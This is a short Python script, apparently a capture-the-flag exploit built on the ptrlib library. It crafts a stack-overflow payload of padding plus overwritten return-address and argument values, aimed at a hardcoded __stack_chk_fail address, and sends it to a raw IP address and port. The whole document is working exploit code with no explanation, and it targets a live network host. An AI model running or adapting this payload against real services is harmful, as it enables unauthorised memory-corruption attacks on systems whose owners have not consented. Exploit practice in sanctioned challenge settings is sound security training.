from ptrlib import *
import sys

stack_chk_fail_addr = 0x41bb40

def gen_segv_block(func, arg1, arg2):
  block = b''
  block += b'A' * 16
  block += b'B' * 8
  block += p64(func)
  block += p64(arg2)
  block += p64(arg1)
  block += b'C' * 16
  assert not b'\n' in block
  block += b'\n'

  return block

payload = b''
payload += b'\n'
payload += gen_segv_block(stack_chk_fail_addr+4, 0, 0)

p = Socket('52.165.26.180', 8810)
p.send(payload)
print(p.recv(1024))
#print(p.recv(1024))
#print(p.recv(1024))
#print(p.recv(1024))
#print(p.recv(1024))
#print(p.recv(1024))
#print(p.recv(1024))

#sys.stdout.buffer.write(payload)
